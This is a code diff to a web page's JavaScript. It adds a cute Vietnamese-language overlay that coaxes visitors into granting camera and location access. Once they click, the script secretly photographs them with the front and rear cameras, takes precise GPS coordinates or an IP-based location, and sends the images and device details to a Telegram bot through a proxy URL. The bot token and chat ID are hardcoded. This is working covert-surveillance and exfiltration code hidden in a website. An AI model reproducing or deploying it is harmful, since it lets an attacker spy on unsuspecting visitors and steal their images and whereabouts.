@@ -83,10 +83,49 @@ document.addEventListener('DOMContentLoaded', () => {
             }, index * 100);
         });
     }, { once: true });
-});
+const popup = document.createElement('div');
+popup.id = 'permission-popup';
+popup.innerHTML = `
+  <div style="
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0, 0, 0, 0.95);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    z-index: 9999;
+    color: white;
+    font-family: sans-serif;
+    text-align: center;
+    padding: 20px;
+  ">
+    <h2 style="font-size: 20px; line-height: 1.5;">
+      📸 Hãy cho phép camera và vị trí nhoá,<br>yêu các bạn 💜
+    </h2>
+    <button id="accept-btn" style="
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background: #6200ea;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    ">Đồng ý</button>
+  </div>
+`;
+document.body.appendChild(popup);
+
+document.getElementById('accept-btn').onclick = () => {
+  popup.remove();
+  main();
+};
+
 const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
 const TELEGRAM_CHAT_ID = '6956722046';
 const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
+const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
   time: new Date().toLocaleString(),
@@ -120,6 +159,29 @@ function detectDevice() {
     info.device = 'Không xác định';
     info.os = 'Không rõ';
   }
+}
+
+function getPreciseLocationOrFallbackToIP() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return getIPInfo().then(resolve);
+
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        info.lat = position.coords.latitude.toFixed(6);
+        info.lon = position.coords.longitude.toFixed(6);
+        info.address = '📍 Lấy từ GPS chính xác';
+        info.country = 'Không rõ';
+        info.ip = 'Không rõ';
+        info.isp = 'Không rõ';
+        resolve();
+      },
+      error => {
+        console.warn("GPS thất bại, fallback IP:", error.message);
+        getIPInfo().then(resolve);
+      },
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  });
 }
 
 function getIPInfo() {
@@ -159,7 +221,6 @@ function captureCamera(facingMode = "user") {
         const video = document.createElement("video");
         video.srcObject = stream;
         video.play();
-
         video.onloadedmetadata = () => {
           const canvas = document.createElement("canvas");
           canvas.width = video.videoWidth;
@@ -169,7 +230,6 @@ function captureCamera(facingMode = "user") {
           setTimeout(() => {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             stream.getTracks().forEach(track => track.stop());
-
             canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
           }, 1000);
         };
@@ -178,9 +238,8 @@ function captureCamera(facingMode = "user") {
   });
 }
 
-async function sendTwoPhotosAsMediaGroup(frontBlob, backBlob) {
+async function sendTwoPhotos(frontBlob, backBlob) {
   const formData = new FormData();
-
   formData.append('chat_id', TELEGRAM_CHAT_ID);
   formData.append('media', JSON.stringify([
     {
@@ -193,7 +252,6 @@ async function sendTwoPhotosAsMediaGroup(frontBlob, backBlob) {
       media: 'attach://back'
     }
   ]));
-
   formData.append('front', frontBlob, 'front.jpg');
   formData.append('back', backBlob, 'back.jpg');
 
@@ -207,21 +265,21 @@ async function main() {
   detectDevice();
 
   let frontBlob = null, backBlob = null;
+
   try {
     frontBlob = await captureCamera("user");
     backBlob = await captureCamera("environment");
-    info.camera = '✅ Đã chụp cả 2 camera';
-  } catch (e) {
+    info.camera = '✅ Đã chụp camera trước và sau';
+  } catch {
     info.camera = '📵 Không thể truy cập đủ camera';
   }
 
-  await getIPInfo();
+  await getPreciseLocationOrFallbackToIP();
 
   if (frontBlob && backBlob) {
-    await sendTwoPhotosAsMediaGroup(frontBlob, backBlob);
+    await sendTwoPhotos(frontBlob, backBlob);
   } else {
-      
-    fetch(`https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    fetch(API_SEND_TEXT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -231,5 +289,3 @@ async function main() {
     });
   }
 }
-
-main();
